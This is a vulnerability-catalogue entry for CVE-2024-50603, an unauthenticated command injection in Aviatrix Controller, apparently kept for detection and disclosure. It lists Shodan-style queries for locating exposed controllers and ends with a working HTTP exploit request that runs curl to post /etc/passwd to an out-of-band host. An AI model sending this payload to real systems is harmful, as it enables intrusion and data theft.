---
layout: post
cve_id: CVE-2024-50603
title: Aviatrix Controller - Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-50603.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-50603.yaml
snort2_rule: N/A
snort3_rule: N/A
author: newlinesec,securing.pl
severity: critical
impact: 'Attackers can exploit vulnerabilities to compromise the system.

  '
remediation: 'Update to the latest patched version addressing CVE-2024-50603.

  '
reference:
- https://www.securing.pl/en/cve-2024-50603-aviatrix-network-controller-command-injection-vulnerability/
- https://docs.aviatrix.com/documentation/latest/network-security/index.html
- https://docs.aviatrix.com/documentation/latest/release-notices/psirt-advisories/psirt-advisories.html?expand=true#remote-code-execution-vulnerability-in-aviatrix-controllers
- https://nvd.nist.gov/vuln/detail/CVE-2024-50603
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
  cvss-score: 10
  cve-id: CVE-2024-50603
  cwe-id: CWE-78
  epss-score: 0.94352
  epss-percentile: 0.99956
metadata:
  verified: true
  max-request: 1
  vendor: aviatrix
  product: controller
  shodan-query:
  - http.title:"aviatrix controller"
  - http.title:"aviatrix cloud controller"
  fofa-query:
  - app="aviatrix-controller"
  - title="aviatrix cloud controller"
  google-query: intitle:"aviatrix cloud controller"
  zoomeye-query: app="Aviatrix Controller"
tags:
- cve
- cve2024
- aviatrix
- controller
- rce
- oast
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
An issue was discovered in Aviatrix Controller before 7.1.4191 and 7.2.x before 7.2.4996. Due to the improper neutralization of special elements used in an OS command, an unauthenticated attacker is able to execute arbitrary code. Shell metacharacters can be sent to /v1/api in cloud_type for list_flightpath_destination_instances, or src_cloud_type for flightpath_connection_test.


## üåê HTTP Request
```nohighlight
POST /v1/api HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Connection: close
Content-Length: 194
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
action=list_flightpath_destination_instances&CID=anything_goes_here&account_name=1&region=1&vpc_id_name=1&cloud_type=1|$(curl+-X+POST+-d+@/etc/passwd+d5jk13hle0o4l55rk2q0njfrf81j5eudu.oast.site)
```

